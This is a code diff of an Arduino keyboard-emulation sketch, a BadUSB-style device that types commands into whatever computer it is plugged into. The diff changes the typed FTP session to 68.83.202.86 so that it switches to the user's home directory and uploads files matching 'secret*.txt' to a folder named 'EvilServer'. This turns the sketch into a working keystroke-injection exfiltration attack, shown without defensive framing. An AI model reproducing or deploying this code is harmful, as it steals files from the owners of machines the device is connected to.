@@ -10,7 +10,7 @@ int count = 0;
 
 void setup() {
   Serial.begin(9600);
-  delay(1000);
+  delay(2000);
 }
 
 
@@ -35,11 +35,14 @@ void loop(){
   delay(1000);
 
   // Your computer will receive these characters from a USB keyboard.
-  Keyboard.println("ftp 68.83.202.86 21");
+  Keyboard.println("ftp -p 68.83.202.86 21");
   Keyboard.println(); 
   Keyboard.println(); 
   Keyboard.println("cd shares/EvilServer"); 
-  Keyboard.println("ls"); 
+  Keyboard.println("lcd ~");
+  Keyboard.println("put secret*.txt"); 
+  delay(500);
+  Keyboard.println("ls");
   delay(10000);
   Keyboard.println("bye");
   
